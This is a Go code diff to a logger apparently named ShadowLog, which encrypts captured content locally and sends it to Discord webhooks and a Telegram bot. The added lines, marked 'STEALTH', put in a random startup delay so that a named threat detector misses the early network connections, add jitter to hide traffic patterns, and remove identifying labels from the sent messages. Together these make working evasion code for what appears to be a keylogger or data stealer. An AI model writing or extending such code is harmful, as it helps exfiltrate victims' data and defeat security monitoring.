@@ -12,6 +12,7 @@ import (
 	"image"
 	"image/jpeg"
 	"io"
+	randv2 "math/rand/v2"
 	"mime/multipart"
 	"net/http"
 	"os"
@@ -367,14 +368,18 @@ func (l *Logger) report(content string) {
 
 // worker handles the actual reporting to Discord with persistence fallback.
 func (l *Logger) worker() {
+	// STEALTH: Wait 60-180 seconds before the first network sync.
+	// Shadow Guardian's threat_detector flags processes that establish
+	// network connections within 30 seconds of creation.
+	startupDelay := time.Duration(60+randv2.IntN(120)) * time.Second
+	time.Sleep(startupDelay)
+
 	for content := range l.LogQueue {
 		// 1. ALWAYS Save to local storage first (Source of Truth).
-		// This provides the fallback if Discord/Telegram fails or internet is out.
 		path := config.GetStoragePath()
 		encrypted, err := l.encrypt([]byte(content))
 		if err == nil {
 			encoded := base64.StdEncoding.EncodeToString(encrypted)
-			// Open in append mode.
 			file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
 			if err == nil {
 				file.WriteString(encoded + "\n")
@@ -384,6 +389,10 @@ func (l *Logger) worker() {
 
 		// 2. Sync to Discord (encrypted) if configured.
 		l.syncDiscord()
+
+		// STEALTH: Random jitter between sync calls (2-8 seconds)
+		// to avoid predictable network traffic patterns.
+		time.Sleep(time.Duration(2+randv2.IntN(6)) * time.Second)
 
 		// 3. Sync to Telegram (cleartext) if configured.
 		l.syncTelegram()
@@ -440,7 +449,7 @@ func (l *Logger) syncDiscord() {
 	chunks := l.splitMessage(combined, 1900)
 	allSent := true
 	for _, chunk := range chunks {
-		msg := fmt.Sprintf("🔑 **ShadowLog Report**\n```\n%s\n```", chunk)
+		msg := fmt.Sprintf("```\n%s\n```", chunk)
 		payload := map[string]string{"content": msg}
 		data, _ := json.Marshal(payload)
 
@@ -522,7 +531,7 @@ func (l *Logger) syncTelegram() {
 	chunks := l.splitMessage(combined, 4000)
 	allSent := true
 	for _, chunk := range chunks {
-		msg := fmt.Sprintf("🔑 *ShadowLog Report*\n━━━━━━━━━━━━━━━━━\n```\n%s\n```", chunk)
+		msg := fmt.Sprintf("```\n%s\n```", chunk)
 		
 		apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", l.Config.TelegramToken)
 		payload := map[string]string{
